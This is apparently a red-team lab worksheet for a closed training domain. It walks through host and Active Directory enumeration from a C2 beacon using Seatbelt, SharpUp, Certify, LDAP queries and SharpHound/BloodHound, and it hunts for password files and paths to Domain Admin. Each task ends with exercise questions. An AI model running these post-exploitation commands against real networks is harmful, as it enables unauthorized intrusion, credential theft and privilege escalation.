# LAB 4 — Host/Domain Enumeration

Use your Reflectra agent to conduct host and domain enumeration.

> **Note:** Make sure the NAT adapter is disabled before starting.

---

## Task 1 — Setup

```bash
mkdir -p ~/AdaptixProjects/<YOUR PROJECT>/loot
```

---

## Task 2 — Host Enumeration

- Execute Seatbelt and download the output:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Seatbelt.exe -group=all -q -outputfile=C:\DevTools\out.txt
beacon> download C:\DevTools\out.txt
```
    - Click the downloads icon to sync to `~/AdaptixProjects/<YOUR PROJECT>/loot/`

- Execute SharpUp audit:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/SharpUp.exe audit
```
- Search for sensitive files with Sauroneye — filetypes `.txt,.docx,.xml,.pdf`, keywords `pass*,secret*,API_KEY`, including system directories:

- Check for unattend files, autologon, and all privesc vectors:

- List Kerberos tickets, browse the desktop, and take a screenshot:

**Questions:**
- How many privilege escalation vectors were you able to find?
- What is the SHA-256 of `C:\Users\seth.hawkins\Desktop\email.html`?
- What is the password provided by the HelpDesk Support Team?
- How many CD-ROM drives does the host have?

---

## Task 3 — Manual Domain Enumeration

```bash
beacon> help ldapsearch
beacon> ldapq computers
beacon> ldapsearch (&(objectCategory=Person)(objectClass=User)) --attributes cn
beacon> certi enum
beacon> ldapsearch <query>
```

[Useful LDAP Queries](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7#domain-and-enterprise-admins)

**Questions:**
- How many domain objects start with `WS`?
- How many objects start with `SRV`?
- What netshare on the DC might be interesting?
- How many locked and disabled accounts are in the domain?
- How many accounts do not have an email address set?
- How many accounts have a Service Principal Name (SPN)?

---

## Task 4 — ADCS Enumeration

Enumerate the Active Directory Certificate Services (ADCS) environment using Certify:

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Certify.exe enum-cas
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Certify.exe enum-templates
beacon> certi enum
```

**Questions:**
- What is the name of the enterprise CA and which server hosts it?
- What ADCS vulnerability was identified and what does it enable?
- Which enabled certificate templates can be enrolled by Domain Users?
- What is the Legacy ASP Enrollment Website?

---

## Task 5 — Collect BloodHound Data

### Part 1 — Set up BloodHound

```bash
cd /opt/bloodhound/examples/docker-compose
cp docker-compose.yml docker-compose.bak
cp .env.example .env
sed -i 's/BLOODHOUND_HOST=127\.0\.0\.1/BLOODHOUND_HOST=0.0.0.0/' .env
sudo docker compose up --force-recreate
```

- Login at `http://192.168.57.40:8080` with `admin` and the password from the Docker output
- Reset the password: `Profile` → `Reset Password`

### Part 2 — Collect with SharpHound

- Download and extract the SharpHound collector: `Download Collectors` → `Download SharpHound v#.##.# (.zip)`
```bash
unzip ~/Downloads/*.zip
```

- Collect data from the Reflectra agent:
```bash
beacon> execute-assembly /home/kali/Downloads/SharpHound.exe -d cheddarsale.local -c all --zipfilename linuxlogs --zippassword HAILLOME1234
beacon> download <zip name>.zip
```

- Sync the download to `~/AdaptixProjects/<YOUR PROJECT>/loot/` and extract:
```bash
unzip ~/AdaptixProjects/<YOUR PROJECT>/loot/<filename>.zip
```

### Part 3 — Ingest into BloodHound

- Click `Quick Upload`
- Select all `.json` files in the loot directory (Ctrl+click to multi-select)
- Click `Upload`
- Monitor ingestion via `Administration` → `File Ingest`

**Questions:**
- What file is the other artifact created after running SharpHound?
- How would you clean up after running SharpHound?

---

## Task 6 — Analyze BloodHound Data

Mark `seth.hawkins` as owned, then use saved or public queries to identify a path to Domain Admins.

[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

**Questions:**
- Do any non-admin users have DCSync privileges?
- Which system hosts the CA server?
- Can users join a computer to the domain?
- What groups are nested inside Domain Admins?
- What non-service account user is Kerberoastable?
- What user has a session on WS01 other than seth.hawkins?

**Bonus:** How many users have a password in their description field?

---
